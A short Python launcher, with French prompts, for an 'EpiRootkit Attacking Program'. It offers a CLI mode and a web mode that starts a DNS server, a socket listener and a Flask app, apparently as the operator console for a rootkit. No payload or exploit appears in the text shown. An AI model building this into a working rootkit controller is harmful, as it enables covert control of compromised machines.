from utils.cli import run_cli
from utils.dns import start_dns_server
from utils.socket import socket_listener
import threading
from app import app

# -------------------------------- MAIN MENU -------------------------------- #

def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    ####################################################################
    # CLI is BAD, need to correct and to adapt with DNS and all commands
    ####################################################################
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    elif choix == '2':
        start_dns_server()
        threading.Thread(target=socket_listener, daemon=True).start()
        app.run(host='0.0.0.0', port=5000)
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

if __name__ == '__main__':
    main()